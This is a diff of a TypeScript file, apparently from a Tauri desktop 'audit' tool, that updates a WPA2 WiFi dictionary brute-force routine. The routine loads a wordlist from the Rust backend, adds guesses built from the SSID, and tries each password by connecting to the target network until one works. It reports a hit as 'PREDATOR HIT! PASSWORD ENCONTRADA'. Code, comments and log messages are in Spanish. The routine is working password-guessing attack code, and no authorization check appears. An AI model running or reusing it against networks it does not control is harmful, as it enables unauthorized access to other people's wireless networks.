@@ -53,70 +53,74 @@ const isGateway = (device: DeviceDTO, identity: HostIdentity | null) => {
 
 export const getExternalAuditScenarios = (): ExternalAuditScenario[] => {
   return [
-    // --- ESCENARIO WIFI ---
+    // --- ESCENARIO WIFI (ACTUALIZADO CON PERSISTENCIA) ---
     {
       id: "wifi_brute_force_dict",
       title: "WIFI: Attack (Dictionary)",
-      description: "Ataque activo de diccionario contra WPA2. Desconecta la red actual para probar credenciales.",
+      description: "Ataque activo de diccionario contra WPA2. Usa wordlist personalizada del sistema.",
       mode: "native",
       category: "WIFI",
       isSupported: () => ({ supported: true }),
       executeNative: async ({ target, onLog, signal }) => {
         const ssid = target;
         onLog("stdout", `⚔️ INICIANDO SECUENCIA DE ATAQUE contra: [ ${ssid} ]`);
-        onLog("stdout", "⚠️ AVISO: La conexión a internet se interrumpirá durante el ataque.");
+        onLog("stdout", "📥 Cargando diccionario desde el sistema de archivos...");
 
-        const dictionary = [
-          "12345678", "123456789", "1234567890",
-          "password", "contraseña", "admin1234",
-          "vodafone1234", "movistar1234", "orange1234",
-          "fibra1234", "internet", "qwertyuiop", "admin", "12345"
-        ];
+        let dictionary: string[] = [];
+        
+        try {
+            // 1. PEDIR DICCIONARIO A RUST
+            dictionary = await invoke<string[]>("get_dictionary");
+            onLog("stdout", `✅ Diccionario cargado: ${dictionary.length} palabras base.`);
+        } catch (e) {
+            onLog("stderr", `⚠️ Error cargando diccionario (usando fallback memoria): ${e}`);
+            dictionary = ["12345678", "password", "admin1234"]; // Fallback de emergencia
+        }
+        
+        // Variaciones dinámicas (Heurística en tiempo real)
+        const heuristic = [ssid, ssid + "123", ssid + "2024", ssid + "2025"];
+        dictionary.push(...heuristic);
 
-        // Variaciones simples
-        dictionary.push(ssid);
-        dictionary.push(ssid + "123");
-        dictionary.push(ssid + "2024");
-        dictionary.push(ssid + "2025");
+        // Eliminar duplicados generados por la heurística
+        dictionary = [...new Set(dictionary)];
 
-        onLog("stdout", `📚 Diccionario cargado: ${dictionary.length} vectores.`);
+        onLog("stdout", `📚 Total vectores a probar: ${dictionary.length}`);
         onLog("stdout", "------------------------------------------------");
 
         for (const pass of dictionary) {
-          // 1. COMPROBAR CANCELACIÓN
-          if (signal?.aborted) {
-            onLog("stderr", "🛑 ATAQUE ABORTADO POR EL USUARIO.");
-            onLog("stdout", "♻️ Intentando restaurar estado del adaptador...");
-            break;
-          }
-
-          onLog("stdout", `🔑 Probando: ${pass}`);
-
-          try {
-            const success = await invoke<boolean>("wifi_connect", { ssid, password: pass });
-
-            if (success) {
-              onLog("stdout", "------------------------------------------------");
-              onLog("stdout", `🔓 PREDATOR HIT! PASSWORD ENCONTRADA: [ ${pass} ]`);
-              onLog("stdout", `✅ Conectado exitosamente a ${ssid}.`);
-              return;
-            } else {
-              onLog("stderr", `❌ Fallo auth: ${pass}`);
+            // Chequeo de cancelación
+            if (signal?.aborted) {
+                onLog("stderr", "🛑 ATAQUE ABORTADO POR EL USUARIO.");
+                break; 
             }
-          } catch (e) {
-            onLog("stderr", `⚠️ Error driver: ${e}`);
-          }
 
-          // Delay para no saturar la tarjeta wifi y permitir que Windows respire
-          await new Promise(r => setTimeout(r, 1500));
+            onLog("stdout", `🔑 Probando: ${pass}`);
+            
+            try {
+                const success = await invoke<boolean>("wifi_connect", { ssid, password: pass });
+                
+                if (success) {
+                    onLog("stdout", "------------------------------------------------");
+                    onLog("stdout", `🔓 PREDATOR HIT! PASSWORD ENCONTRADA: [ ${pass} ]`);
+                    onLog("stdout", `✅ Conectado exitosamente a ${ssid}.`);
+                    return; 
+                } else {
+                    onLog("stderr", `❌ Fallo auth: ${pass}`);
+                }
+            } catch (e) {
+                onLog("stderr", `⚠️ Error driver: ${e}`);
+            }
+            
+            // Delay de seguridad
+            await new Promise(r => setTimeout(r, 1500));
         }
 
         if (!signal?.aborted) {
-          onLog("stderr", "💀 DICCIONARIO AGOTADO. Ataque fallido.");
+            onLog("stderr", "💀 DICCIONARIO AGOTADO. Ataque fallido.");
         }
-
+        
         onLog("stdout", "------------------------------------------------");
-        onLog("stdout", "ℹ️ NOTA: Windows intentará reconectar a tu red habitual automáticamente.");
+        onLog("stdout", "ℹ️ Windows intentará reconectar a tu red habitual.");
       }
     },
 
